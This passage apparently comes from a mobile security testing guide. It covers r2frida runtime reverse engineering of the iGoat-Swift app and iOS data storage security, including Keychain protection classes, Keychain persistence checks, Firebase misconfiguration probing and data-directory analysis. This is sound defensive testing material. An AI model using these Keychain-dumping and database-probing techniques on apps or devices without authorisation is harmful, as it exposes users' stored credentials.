command you'll have to specify an encoding using the \texttt{-e} flag
and in this case \texttt{l} for 16-bit little-endian character.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\FunctionTok{strings}\NormalTok{ {-}e l memory\_ios }\KeywordTok{|} \FunctionTok{grep}\NormalTok{ owasp{-}mstg}
\ExtensionTok{owasp{-}mstg}
\end{Highlighting}
\end{Shaded}

Runtime Reverse Engineering

Runtime reverse engineering can be seen as the on-the-fly version of
reverse engineering where you don't have the binary data to your host
computer. Instead, you'll analyze it straight from the memory of the
app.

We'll keep using the iGoat-Swift app, open a session with r2frida
\texttt{r2\ frida://usb//iGoat-Swift} and you can start by displaying
the target binary information by using the \texttt{\textbackslash{}i}
command:

\begin{verbatim}
[0x00000000]> \i
arch                arm
bits                64
os                  darwin
pid                 2166
uid                 501
objc                true
runtime             V8
java                false
cylang              true
pageSize            16384
pointerSize         8
codeSigningPolicy   optional
isDebuggerAttached  false
cwd                 /
\end{verbatim}

Search all symbols of a certain module with
\texttt{\textbackslash{}is\ \textless{}lib\textgreater{}},
e.g.~\texttt{\textbackslash{}is\ libboringssl.dylib}.

The following does a case-insensitive search (grep) for symbols
including ``aes'' (\texttt{\textasciitilde{}+aes}).

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}is libboringssl.dylib\textasciitilde{}+aes}
\ExtensionTok{0x1863d6ed8}\NormalTok{ s EVP\_aes\_128\_cbc}
\ExtensionTok{0x1863d6ee4}\NormalTok{ s EVP\_aes\_192\_cbc}
\ExtensionTok{0x1863d6ef0}\NormalTok{ s EVP\_aes\_256\_cbc}
\ExtensionTok{0x1863d6f14}\NormalTok{ s EVP\_has\_aes\_hardware}
\ExtensionTok{0x1863d6f1c}\NormalTok{ s aes\_init\_key}
\ExtensionTok{0x1863d728c}\NormalTok{ s aes\_cipher}
\ExtensionTok{0x0}\NormalTok{ u ccaes\_cbc\_decrypt\_mode}
\ExtensionTok{0x0}\NormalTok{ u ccaes\_cbc\_encrypt\_mode}
\ExtensionTok{...}
\end{Highlighting}
\end{Shaded}

Or you might prefer to look into the imports/exports. For example:

\begin{itemize}
\tightlist
\item
  List all imports of the main binary:
  \texttt{\textbackslash{}ii\ iGoat-Swift}.
\item
  List exports of the libc++.1.dylib library:
  \texttt{\textbackslash{}iE\ /usr/lib/libc++.1.dylib}.
\end{itemize}

\begin{quote}
For big binaries it's recommended to pipe the output to the internal
less program by appending \texttt{\textasciitilde{}..},
i.e.~\texttt{\textbackslash{}ii\ iGoat-Swift\textasciitilde{}..} (if
not, for this binary, you'd get almost 5000 lines printed to your
terminal).
\end{quote}

The next thing you might want to look at are the classes:

\begin{verbatim}
[0x00000000]> \ic~+passcode
PSPasscodeField
_UITextFieldPasscodeCutoutBackground
UIPasscodeField
PasscodeFieldCell
...
\end{verbatim}

List class fields:

\begin{verbatim}
[0x19687256c]> \ic UIPasscodeField
0x000000018eec6680 - becomeFirstResponder
0x000000018eec5d78 - appendString:
0x000000018eec6650 - canBecomeFirstResponder
0x000000018eec6700 - isFirstResponder
0x000000018eec6a60 - hitTest:forEvent:
0x000000018eec5384 - setKeyboardType:
0x000000018eec5c8c - setStringValue:
0x000000018eec5c64 - stringValue
...
\end{verbatim}

Imagine that you are interested into
\texttt{0x000000018eec5c8c\ -\ setStringValue:}. You can seek to that
address with \texttt{s\ 0x000000018eec5c8c}, analyze that function
\texttt{af} and print 10 lines of its disassembly \texttt{pd\ 10}:

\begin{verbatim}
[0x18eec5c8c]> pd 10
╭ (fcn) fcn.18eec5c8c 35
│   fcn.18eec5c8c (int32_t arg1, int32_t arg3);
│ bp: 0 (vars 0, args 0)
│ sp: 0 (vars 0, args 0)
│ rg: 2 (vars 0, args 2)
│           0x18eec5c8c      f657bd         not byte [rdi - 0x43]      ; arg1
│           0x18eec5c8f      a9f44f01a9     test eax, 0xa9014ff4
│           0x18eec5c94      fd             std
│       ╭─< 0x18eec5c95      7b02           jnp 0x18eec5c99
│       │   0x18eec5c97      a9fd830091     test eax, 0x910083fd
│           0x18eec5c9c      f30300         add eax, dword [rax]
│           0x18eec5c9f      aa             stosb byte [rdi], al
│       ╭─< 0x18eec5ca0      e003           loopne 0x18eec5ca5
│       │   0x18eec5ca2      02aa9b494197   add ch, byte [rdx - 0x68beb665] ; arg3
╰           0x18eec5ca8      f4             hlt
\end{verbatim}

Finally, instead of doing a full memory search for strings, you may want
to retrieve the strings from a certain binary and filter them, as you'd
do \emph{offline} with radare2. For this you have to find the binary,
seek to it and then run the \texttt{\textbackslash{}iz} command.

\begin{quote}
It's recommended to apply a filter with a keyword
\texttt{\textasciitilde{}\textless{}keyword\textgreater{}}/\texttt{\textasciitilde{}+\textless{}keyword\textgreater{}}
to minimize the terminal output. If just want to explore all results you
can also pipe them to the internal less
\texttt{\textbackslash{}iz\textasciitilde{}..}.
\end{quote}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}il\textasciitilde{}iGoa}
\ExtensionTok{0x00000001006b8000}\NormalTok{ iGoat{-}Swift}
\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ s 0x00000001006b8000}
\NormalTok{[}\ExtensionTok{0x1006b8000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}iz}
\ExtensionTok{Reading}\NormalTok{ 2.390625MB ...}
\ExtensionTok{Do}\NormalTok{ you want to print 8568 lines? (y/N) }\ExtensionTok{N}
\NormalTok{[}\ExtensionTok{0x1006b8000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}iz\textasciitilde{}+hill}
\ExtensionTok{Reading}\NormalTok{ 2.390625MB ...}
\NormalTok{[}\ExtensionTok{0x1006b8000}\NormalTok{]}\OperatorTok{>}\NormalTok{ \textbackslash{}iz\textasciitilde{}+pass}
\ExtensionTok{Reading}\NormalTok{ 2.390625MB ...}
\ExtensionTok{0x00000001006b93ed}  \StringTok{"passwordTextField"}
\ExtensionTok{0x00000001006bb11a}  \StringTok{"11iGoat\_Swift20KeychainPasswordItemV0C5ErrorO"}
\ExtensionTok{0x00000001006bb164}  \StringTok{"unexpectedPasswordData"}
\ExtensionTok{0x00000001006d3f62}  \StringTok{"Error reading password from keychain {-} "}
\ExtensionTok{0x00000001006d40f2}  \StringTok{"Incorrect Password"}
\ExtensionTok{0x00000001006d4112}  \StringTok{"Enter the correct password"}
\ExtensionTok{0x00000001006d4632}  \StringTok{"T@"}\NormalTok{UITextField}\StringTok{",N,W,VpasswordField"}
\ExtensionTok{0x00000001006d46f2}  \StringTok{"CREATE TABLE IF NOT EXISTS creds (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT);"}
\ExtensionTok{0x00000001006d4792}  \StringTok{"INSERT INTO creds(username, password) VALUES(?, ?)"}
\end{Highlighting}
\end{Shaded}

To learn more, please refer to the
\href{https://github.com/enovella/r2frida-wiki/blob/master/README.md}{r2frida
wiki}.

\hypertarget{references-17}{%
\subsubsection{References}\label{references-17}}

\begin{itemize}
\tightlist
\item
  Apple's Entitlements Troubleshooting -
  \url{https://developer.apple.com/library/content/technotes/tn2415/_index.html}
\item
  Apple's Code Signing -
  \url{https://developer.apple.com/support/code-signing/}
\item
  Cycript Manual - \url{http://www.cycript.org/manual/}
\item
  iOS Instrumentation without Jailbreak -
  \url{https://www.nccgroup.trust/au/about-us/newsroom-and-events/blogs/2016/october/ios-instrumentation-without-jailbreak/}
\item
  Frida iOS Tutorial - \url{https://www.frida.re/docs/ios/}
\item
  Frida iOS Examples - \url{https://www.frida.re/docs/examples/ios/}
\item
  r2frida Wiki -
  \url{https://github.com/enovella/r2frida-wiki/blob/master/README.md}
\item
  {[}\#miller{]} - Charlie Miller, Dino Dai Zovi. The iOS Hacker's
  Handbook. Wiley, 2012 -
  \url{https://www.wiley.com/en-us/iOS+Hacker\%27s+Handbook-p-9781118204122}
\item
  {[}\#levin{]} Jonathan Levin. Mac OS X and iOS Internals: To the
  Apple's Core. Wiley, 2013 - \url{http://newosxbook.com/MOXiI.pdf}
\end{itemize}

\hypertarget{tools-10}{%
\paragraph{Tools}\label{tools-10}}

\begin{itemize}
\tightlist
\item
  class-dump - \url{http://stevenygard.com/projects/class-dump/}
\item
  class-dump-dyld - \url{https://github.com/limneos/classdump-dyld/}
\item
  class-dump-z -
  \url{https://code.google.com/archive/p/networkpx/wikis/class_dump_z.wiki}
\item
  Cycript - \url{http://www.cycript.org/}
\item
  Damn Vulnerable iOS App - \url{http://damnvulnerableiosapp.com/}
\item
  dsdump - \url{https://github.com/DerekSelander/dsdump}
\item
  Frida - \url{https://www.frida.re}
\item
  Ghidra - \url{https://ghidra-sre.org/}
\item
  Hopper - \url{https://www.hopperapp.com/}
\item
  ios-deploy - \url{https://github.com/phonegap/ios-deploy}
\item
  IPA Installer Console -
  \url{https://cydia.saurik.com/package/com.autopear.installipa/}
\item
  ipainstaller -
  \url{https://cydia.saurik.com/package/com.slugrail.ipainstaller/}
\item
  MachoOView - \url{https://sourceforge.net/projects/machoview/}
\item
  Objection - \url{https://github.com/sensepost/objection}
\item
  Optool - \url{https://github.com/alexzielenski/optool}
\item
  OWASP UnCrackable Apps for iOS -
  \url{https://github.com/OWASP/owasp-mstg/tree/master/Crackmes\#ios}
\item
  r2frida - \url{https://github.com/nowsecure/r2frida}
\item
  Radare2 - \url{https://rada.re/r/}
\item
  Reverse Engineering tools for iOS Apps -
  \url{http://iphonedevwiki.net/index.php/Reverse_Engineering_Tools}
\item
  Swizzler project - \url{https://github.com/vtky/Swizzler2/}
\item
  Xcode command line developer tools -
  \url{https://railsapps.github.io/xcode-command-line-tools.html}
\end{itemize}

\hypertarget{data-storage-on-ios}{%
\subsection{Data Storage on iOS}\label{data-storage-on-ios}}

The protection of sensitive data, such as authentication tokens and
private information, is key for mobile security. In this chapter, you'll
learn about the iOS APIs for local data storage, and best practices for
using them.

\hypertarget{testing-local-data-storage-mstg-storage-1-and-mstg-storage-2}{%
\subsubsection{Testing Local Data Storage (MSTG-STORAGE-1 and
MSTG-STORAGE-2)}\label{testing-local-data-storage-mstg-storage-1-and-mstg-storage-2}}

As little sensitive data as possible should be saved in permanent local
storage. However, in most practical scenarios, at least some user data
must be stored. Fortunately, iOS offers secure storage APIs, which allow
developers to use the cryptographic hardware available on every iOS
device. If these APIs are used correctly, sensitive data and files can
be secured via hardware-backed 256-bit AES encryption.

\hypertarget{data-protection-api}{%
\paragraph{Data Protection API}\label{data-protection-api}}

App developers can leverage the iOS \emph{Data Protection} APIs to
implement fine-grained access control for user data stored in flash
memory. The APIs are built on top of the Secure Enclave Processor (SEP),
which was introduced with the iPhone 5S. The SEP is a coprocessor that
provides cryptographic operations for data protection and key
management. A device-specific hardware key-the device UID (Unique ID)-is
embedded in the secure enclave, ensuring the integrity of data
protection even when the operating system kernel is compromised.

The data protection architecture is based on a hierarchy of keys. The
UID and the user passcode key (which is derived from the user's
passphrase via the PBKDF2 algorithm) sit at the top of this hierarchy.
Together, they can be used to ``unlock'' so-called class keys, which are
associated with different device states (e.g., device locked/unlocked).

Every file stored on the iOS file system is encrypted with its own
per-file key, which is contained in the file metadata. The metadata is
encrypted with the file system key and wrapped with the class key
corresponding to the protection class the app selected when creating the
file.

The following illustration shows the
\href{https://www.apple.com/business/docs/iOS_Security_Guide.pdf}{iOS
Data Protection Key Hierarchy}.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/153fa4a61498a02f5937730470fadbf4339e20ac.jpg}
\caption{Key Hierarchy iOS}
\end{figure}

Files can be assigned to one of four different protection classes, which
are explained in more detail in the
\href{https://www.apple.com/business/docs/iOS_Security_Guide.pdf}{iOS
Security Guide}:

\begin{itemize}
\item
  \textbf{Complete Protection (NSFileProtectionComplete)}: A key derived
  from the user passcode and the device UID protects this class key. The
  derived key is wiped from memory shortly after the device is locked,
  making the data inaccessible until the user unlocks the device.
\item
  \textbf{Protected Unless Open (NSFileProtectionCompleteUnlessOpen)}:
  This protection class is similar to Complete Protection, but, if the
  file is opened when unlocked, the app can continue to access the file
  even if the user locks the device. This protection class is used when,
  for example, a mail attachment is downloading in the background.
\item
  \textbf{Protected Until First User Authentication
  (NSFileProtectionCompleteUntilFirstUserAuthentication)}: The file can
  be accessed as soon as the user unlocks the device for the first time
  after booting. It can be accessed even if the user subsequently locks
  the device and the class key is not removed from memory.
\item
  \textbf{No Protection (NSFileProtectionNone)}: The key for this
  protection class is protected with the UID only. The class key is
  stored in ``Effaceable Storage'', which is a region of flash memory on
  the iOS device that allows the storage of small amounts of data. This
  protection class exists for fast remote wiping (immediate deletion of
  the class key, which makes the data inaccessible).
\end{itemize}

All class keys except \texttt{NSFileProtectionNone} are encrypted with a
key derived from the device UID and the user's passcode. As a result,
decryption can happen only on the device itself and requires the correct
passcode.

Since iOS 7, the default data protection class is ``Protected Until
First User Authentication''.

\hypertarget{the-keychain}{%
\subparagraph{The Keychain}\label{the-keychain}}

The iOS Keychain can be used to securely store short, sensitive bits of
data, such as encryption keys and session tokens. It is implemented as
an SQLite database that can be accessed through the Keychain APIs only.

On macOS, every user application can create as many Keychains as
desired, and every login account has its own Keychain. The
\href{https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/02concepts/concepts.html}{structure
of the Keychain on iOS} is different: only one Keychain is available to
all apps. Access to the items can be shared between apps signed by the
same developer via the
\href{https://developer.apple.com/library/content/documentation/IDEs/Conceptual/AppDistributionGuide/AddingCapabilities/AddingCapabilities.html}{access
groups feature} of the attribute
\href{https://developer.apple.com/documentation/security/ksecattraccessgroup}{\texttt{kSecAttrAccessGroup}}.
Access to the Keychain is managed by the \texttt{securityd} daemon,
which grants access according to the app's
\texttt{Keychain-access-groups}, \texttt{application-identifier}, and
\texttt{application-group} entitlements.

The
\href{https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/02concepts/concepts.html}{Keychain
API} includes the following main operations:

\begin{itemize}
\tightlist
\item
  \texttt{SecItemAdd}
\item
  \texttt{SecItemUpdate}
\item
  \texttt{SecItemCopyMatching}
\item
  \texttt{SecItemDelete}
\end{itemize}

Data stored in the Keychain is protected via a class structure that is
similar to the class structure used for file encryption. Items added to
the Keychain are encoded as a binary plist and encrypted with a 128-bit
AES per-item key in Galois/Counter Mode (GCM). Note that larger blobs of
data aren't meant to be saved directly in the Keychain-that's what the
Data Protection API is for. You can configure data protection for
Keychain items by setting the \texttt{kSecAttrAccessible} key in the
call to \texttt{SecItemAdd} or \texttt{SecItemUpdate}. The following
configurable
\href{https://developer.apple.com/documentation/security/keychain_services/keychain_items/item_attribute_keys_and_values\#1679100}{accessibility
values for kSecAttrAccessible} are the Keychain Data Protection classes:

\begin{itemize}
\tightlist
\item
  \texttt{kSecAttrAccessibleAlways}: The data in the Keychain item can
  always be accessed, regardless of whether the device is locked.
\item
  \texttt{kSecAttrAccessibleAlwaysThisDeviceOnly}: The data in the
  Keychain item can always be accessed, regardless of whether the device
  is locked. The data won't be included in an iCloud or local backup.
\item
  \texttt{kSecAttrAccessibleAfterFirstUnlock}: The data in the Keychain
  item can't be accessed after a restart until the device has been
  unlocked once by the user.
\item
  \texttt{kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly}: The data in
  the Keychain item can't be accessed after a restart until the device
  has been unlocked once by the user. Items with this attribute do not
  migrate to a new device. Thus, after restoring from a backup of a
  different device, these items will not be present.
\item
  \texttt{kSecAttrAccessibleWhenUnlocked}: The data in the Keychain item
  can be accessed only while the device is unlocked by the user.
\item
  \texttt{kSecAttrAccessibleWhenUnlockedThisDeviceOnly}: The data in the
  Keychain item can be accessed only while the device is unlocked by the
  user. The data won't be included in an iCloud or local backup.
\item
  \texttt{kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly}: The data in
  the Keychain can be accessed only when the device is unlocked. This
  protection class is only available if a passcode is set on the device.
  The data won't be included in an iCloud or local backup.
\end{itemize}

\texttt{AccessControlFlags} define the mechanisms with which users can
authenticate the key (\texttt{SecAccessControlCreateFlags}):

\begin{itemize}
\tightlist
\item
  \texttt{kSecAccessControlDevicePasscode}: Access the item via a
  passcode.
\item
  \texttt{kSecAccessControlBiometryAny}: Access the item via one of the
  fingerprints registered to Touch ID. Adding or removing a fingerprint
  won't invalidate the item.
\item
  \texttt{kSecAccessControlBiometryCurrentSet}: Access the item via one
  of the fingerprints registered to Touch ID. Adding or removing a
  fingerprint \emph{will} invalidate the item.
\item
  \texttt{kSecAccessControlUserPresence}: Access the item via either one
  of the registered fingerprints (using Touch ID) or default to the
  passcode.
\end{itemize}

Please note that keys secured by Touch ID (via
\texttt{kSecAccessControlBiometryAny} or
\texttt{kSecAccessControlBiometryCurrentSet}) are protected by the
Secure Enclave: The Keychain holds a token only, not the actual key. The
key resides in the Secure Enclave.

Starting with iOS 9, you can do ECC-based signing operations in the
Secure Enclave. In that scenario, the private key and the cryptographic
operations reside within the Secure Enclave. See the static analysis
section for more info on creating the ECC keys. iOS 9 supports only
256-bit ECC. Furthermore, you need to store the public key in the
Keychain because it can't be stored in the Secure Enclave. After the key
is created, you can use the \texttt{kSecAttrKeyType} to indicate the
type of algorithm you want to use the key with.

In case you want to use these mechanisms, it is recommended to test
whether the passcode has been set. In iOS 8, you will need to check
whether you can read/write from an item in the Keychain protected by the
\texttt{kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly} attribute. From
iOS 9 onward you can check whether a lock screen is set, using
\texttt{LAContext}:

Swift:

\begin{verbatim}
public func devicePasscodeEnabled() -> Bool {
    return LAContext().canEvaluatePolicy(.deviceOwnerAuthentication, error: nil)
}
\end{verbatim}

Objective-C:

\begin{verbatim}
-(BOOL)devicePasscodeEnabled:(LAContex)context{
  if ([context canEvaluatePolicy:LAPolicyDeviceOwnerAuthentication error:nil]) {
        return true;
    } else {
        creturn false;
    }
}
\end{verbatim}

Keychain Data Persistence

On iOS, when an application is uninstalled, the Keychain data used by
the application is retained by the device, unlike the data stored by the
application sandbox which is wiped. In the event that a user sells their
device without performing a factory reset, the buyer of the device may
be able to gain access to the previous user's application accounts and
data by reinstalling the same applications used by the previous user.
This would require no technical ability to perform.

When assessing an iOS application, you should look for Keychain data
persistence. This is normally done by using the application to generate
sample data that may be stored in the Keychain, uninstalling the
application, then reinstalling the application to see whether the data
was retained between application installations. You can also verify
persistence by using the iOS security assessment framework Needle to
read the Keychain. The following Needle commands demonstrate this
procedure:

\begin{verbatim}
$ python needle.py
[needle] > use storage/data/keychain_dump
[needle] > run
  {
   "Creation Time" : "Jan 15, 2018, 10:20:02 GMT",
   "Account" : "username",
   "Service" : "",
   "Access Group" : "ABCD.com.test.passwordmngr-test",
   "Protection" : "kSecAttrAccessibleWhenUnlocked",
   "Modification Time" : "Jan 15, 2018, 10:28:02 GMT",
   "Data" : "testUser",
   "AccessControl" : "Not Applicable"
 },
 {
   "Creation Time" : "Jan 15, 2018, 10:20:02 GMT",
   "Account" : "password",
   "Service" : "",
   "Access Group" : "ABCD.com.test.passwordmngr-test,
   "Protection" : "kSecAttrAccessibleWhenUnlocked",
   "Modification Time" : "Jan 15, 2018, 10:28:02 GMT",
   "Data" : "rosebud",
   "AccessControl" : "Not Applicable"
 }
\end{verbatim}

There's no iOS API that developers can use to force wipe data when an
application is uninstalled. Instead, developers should take the
following steps to prevent Keychain data from persisting between
application installations:

\begin{itemize}
\tightlist
\item
  When an application is first launched after installation, wipe all
  Keychain data associated with the application. This will prevent a
  device's second user from accidentally gaining access to the previous
  user's accounts. The following Swift example is a basic demonstration
  of this wiping procedure:
\end{itemize}

\begin{verbatim}
let userDefaults = UserDefaults.standard

if userDefaults.bool(forKey: "hasRunBefore") == false {
    // Remove Keychain items here

    // Update the flag indicator
    userDefaults.set(true, forKey: "hasRunBefore")
    userDefaults.synchronize() // Forces the app to update UserDefaults
}
\end{verbatim}

\begin{itemize}
\tightlist
\item
  When developing logout functionality for an iOS application, make sure
  that the Keychain data is wiped as part of account logout. This will
  allow users to clear their accounts before uninstalling an
  application.
\end{itemize}

\hypertarget{static-analysis-52}{%
\paragraph{Static Analysis}\label{static-analysis-52}}

When you have access to the source code of an iOS app, try to spot
sensitive data that's saved and processed throughout the app. This
includes passwords, secret keys, and personally identifiable information
(PII), but it may as well include other data identified as sensitive by
industry regulations, laws, and company policies. Look for this data
being saved via any of the local storage APIs listed below. Make sure
that sensitive data is never stored without appropriate protection. For
example, authentication tokens should not be saved in
\texttt{NSUserDefaults} without additional encryption.

The encryption must be implemented so that the secret key is stored in
the Keychain with secure settings, ideally
\texttt{kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly}. This ensures
the usage of hardware-backed storage mechanisms. Make sure that the
\texttt{AccessControlFlags} are set according to the security policy of
the keys in the KeyChain.

\href{https://developer.apple.com/library/content/samplecode/GenericKeychain/Introduction/Intro.html\#//apple_ref/doc/uid/DTS40007797-Intro-DontLinkElementID_2}{Generic
examples of using the KeyChain} to store, update, and delete data can be
found in the official Apple documentation. The official Apple
documentation also includes an example of using
\href{https://developer.apple.com/documentation/localauthentication/accessing_keychain_items_with_face_id_or_touch_id}{Touch
ID and passcode protected keys}.

Here is sample Swift code you can use to create keys (Notice the
\texttt{kSecAttrTokenID\ as\ String:\ kSecAttrTokenIDSecureEnclave}:
this indicates that we want to use the Secure Enclave directly.):

\begin{verbatim}
// private key parameters
let privateKeyParams = [
    kSecAttrLabel as String: "privateLabel",
    kSecAttrIsPermanent as String: true,
    kSecAttrApplicationTag as String: "applicationTag",
] as CFDictionary

// public key parameters
let publicKeyParams = [
    kSecAttrLabel as String: "publicLabel",
    kSecAttrIsPermanent as String: false,
    kSecAttrApplicationTag as String: "applicationTag",
] as CFDictionary

// global parameters
let parameters = [
    kSecAttrKeyType as String: kSecAttrKeyTypeEC,
    kSecAttrKeySizeInBits as String: 256,
    kSecAttrTokenID as String: kSecAttrTokenIDSecureEnclave,
    kSecPublicKeyAttrs as String: publicKeyParams,
    kSecPrivateKeyAttrs as String: privateKeyParams,
] as CFDictionary

var pubKey, privKey: SecKey?
let status = SecKeyGeneratePair(parameters, &pubKey, &privKey)

if status != errSecSuccess {
    // Keys created successfully
}
\end{verbatim}

When checking an iOS app for insecure data storage, consider the
following ways to store data because none of them encrypt data by
default:

\hypertarget{nsuserdefaults}{%
\subparagraph{\texorpdfstring{\texttt{NSUserDefaults}}{NSUserDefaults}}\label{nsuserdefaults}}

The
\href{https://developer.apple.com/documentation/foundation/nsuserdefaults}{\texttt{NSUserDefaults}}
class provides a programmatic interface for interacting with the default
system. The default system allows an application to customize its
behavior according to user preferences. Data saved by
\texttt{NSUserDefaults} can be viewed in the application bundle. This
class stores data in a plist file, but it's meant to be used with small
amounts of data.

\hypertarget{file-system}{%
\subparagraph{File system}\label{file-system}}

\begin{itemize}
\tightlist
\item
  \texttt{NSData}: creates static data objects, while
  \texttt{NSMutableData} creates dynamic data objects. \texttt{NSData}
  and \texttt{NSMutableData} are typically used for data storage, but
  they are also useful for distributed objects applications, in which
  data contained in data objects can be copied or moved between
  applications. The following are methods used to write \texttt{NSData}
  objects:

  \begin{itemize}
  \tightlist
  \item
    \texttt{NSDataWritingWithoutOverwriting}
  \item
    \texttt{NSDataWritingFileProtectionNone}
  \item
    \texttt{NSDataWritingFileProtectionComplete}
  \item
    \texttt{NSDataWritingFileProtectionCompleteUnlessOpen}
  \item
    \texttt{NSDataWritingFileProtectionCompleteUntilFirstUserAuthentication}
  \end{itemize}
\item
  \texttt{writeToFile}: stores data as part of the \texttt{NSData} class
\item
  \texttt{NSSearchPathForDirectoriesInDomains,\ NSTemporaryDirectory}:
  used to manage file paths
\item
  \texttt{NSFileManager}: lets you examine and change the contents of
  the file system. You can use \texttt{createFileAtPath} to create a
  file and write to it.
\end{itemize}

The following example shows how to create a securely encrypted file
using the \texttt{createFileAtPath} method:

\begin{verbatim}
[[NSFileManager defaultManager] createFileAtPath:[self filePath]
  contents:[@"secret text" dataUsingEncoding:NSUTF8StringEncoding]
  attributes:[NSDictionary dictionaryWithObject:NSFileProtectionComplete
  forKey:NSFileProtectionKey]];
\end{verbatim}

\hypertarget{coredata}{%
\subparagraph{CoreData}\label{coredata}}

\href{https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html\#//apple_ref/doc/uid/TP40001075-CH8-SW1}{\texttt{Core\ Data}}
is a framework for managing the model layer of objects in your
application. It provides general and automated solutions to common tasks
associated with object life cycles and object graph management,
including persistence.
\href{https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/}{Core
Data can use SQLite as its persistent store}, but the framework itself
is not a database.

CoreData does not encrypt it's data by default. As part of a research
project (iMAS) from the MITRE Corporation, that was focused on open
source iOS security controls, an additional encryption layer can be
added to CoreData. See the
\href{https://github.com/project-imas/encrypted-core-data}{GitHub Repo}
for more details.

\hypertarget{sqlite-databases}{%
\subparagraph{SQLite Databases}\label{sqlite-databases}}

The SQLite 3 library must be added to an app if the app is to use
SQLite. This library is a C++ wrapper that provides an API for the
SQLite commands.

\hypertarget{firebase-real-time-databases-1}{%
\subparagraph{Firebase Real-time
Databases}\label{firebase-real-time-databases-1}}

\hypertarget{firebase-real-time-databases-2}{%
\subparagraph{Firebase Real-time
Databases}\label{firebase-real-time-databases-2}}

Firebase is a development platform with more than 15 products, and one
of them is Firebase Real-time Database. It can be leveraged by
application developers to store and sync data with a NoSQL cloud-hosted
database. The data is stored as JSON and is synchronized in real-time to
every connected client and also remains available even when the
application goes offline.

A misconfigured Firebase instance can be identified by making the
following network call:

\texttt{https://\textbackslash{}\textless{}firebaseProjectName\textbackslash{}\textgreater{}.firebaseio.com/.json}

The \emph{firebaseProjectName} can be retrieved from the property
list(.plist) file. For example, \emph{PROJECT\_ID} key stores the
corresponding Firebase project name in \emph{GoogleService-Info.plist}
file.

Alternatively, the analysts can use
\href{https://github.com/shivsahni/FireBaseScanner}{Firebase Scanner}, a
python script that automates the task above as shown below:

\begin{verbatim}
python FirebaseScanner.py -f <commaSeperatedFirebaseProjectNames>
\end{verbatim}

\hypertarget{realm-databases-1}{%
\subparagraph{Realm databases}\label{realm-databases-1}}

\href{https://realm.io/docs/objc/latest/}{Realm Objective-C} and
\href{https://realm.io/docs/swift/latest/}{Realm Swift} aren't supplied
by Apple, but they are still worth noting. They store everything
unencrypted, unless the configuration has encryption enabled.

The following example demonstrates how to use encryption with a Realm
database:

\begin{verbatim}
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
  let realm = try Realm(configuration: config)
  // Use the Realm as normal
} catch let error as NSError {
  // If the encryption key is wrong, `error` will say that it's an invalid database
  fatalError("Error opening realm: \(error)")
}
\end{verbatim}

\hypertarget{couchbase-lite-databases}{%
\subparagraph{Couchbase Lite Databases}\label{couchbase-lite-databases}}

\href{https://github.com/couchbase/couchbase-lite-ios}{Couchbase Lite}
is a lightweight, embedded, document-oriented (NoSQL) database engine
that can be synced. It compiles natively for iOS and macOS.

\hypertarget{yapdatabase}{%
\subparagraph{YapDatabase}\label{yapdatabase}}

\href{https://github.com/yapstudios/YapDatabase}{YapDatabase} is a
key/value store built on top of SQLite.

\hypertarget{dynamic-analysis-49}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-49}}

One way to determine whether sensitive information (like credentials and
keys) is stored insecurely without leveraging native iOS functions is to
analyze the app's data directory. Triggering all app functionality
before the data is analyzed is important because the app may store
sensitive data only after specific functionality has been triggered. You
can then perform static analysis for the data dump according to generic
keywords and app-specific data.

The following steps can be used to determine how the application stores
data locally on a jailbroken iOS device:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Trigger the functionality that stores potentially sensitive data.
\item
  Connect to the iOS device and navigate to its Bundle directory (this
  applies to iOS versions 8.0 and above):
  \texttt{/var/mobile/Containers/Data/Application/\$APP\_ID/}
\item
  Execute grep with the data that you've stored, for example:
  \texttt{grep\ -iRn\ "USERID"}.
\item
  If the sensitive data is stored in plaintext, the app fails this test.
\end{enumerate}

You can analyze the app's data directory on a non-jailbroken iOS device
by using third-party applications, such as
\href{https://imazing.com}{iMazing}.

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Trigger the functionality that stores potentially sensitive data.
\item
  Connect the iOS device to your workstation and launch iMazing.
\item
  Select ``Apps'', right-click the desired iOS application, and select
  ``Extract App''.
\item
  Navigate to the output directory and locate
  \texttt{\$APP\_NAME.imazing}. Rename it to \texttt{\$APP\_NAME.zip}.
\item
  Unpack the ZIP file. You can then analyze the application data.
\end{enumerate}

\begin{quote}
Note that tools like iMazing don't copy data directly from the device.
They try to extract data from the backups they create. Therefore,
getting all the app data that's stored on the iOS device is impossible:
not all folders are included in backups. Use a jailbroken device or
repackage the app with Frida and use a tool like objection to access all
the data and files.
\end{quote}

If you added the Frida library to the app and repackaged it as described
in ``Dynamic Analysis on Non-Jailbroken Devices'' (from the ``Tampering
and Reverse Engineering on iOS'' chapter), you can use
\href{https://github.com/sensepost/objection}{objection} to transfer
files directly from the app's data directory or
\href{https://github.com/sensepost/objection/wiki/Using-objection\#getting-started-ios-edition}{read
files in objection} as explained in the chapter ``Basic Security Testing
on iOS'', section
``\href{0x06b-Basic-Security-Testing.md\#host-device-data-transfer}{Host-Device
Data Transfer}''.

The Keychain contents can be dumped during dynamic analysis. On a
jailbroken device, you can use
\href{https://github.com/ptoomey3/Keychain-Dumper/}{Keychain dumper} as
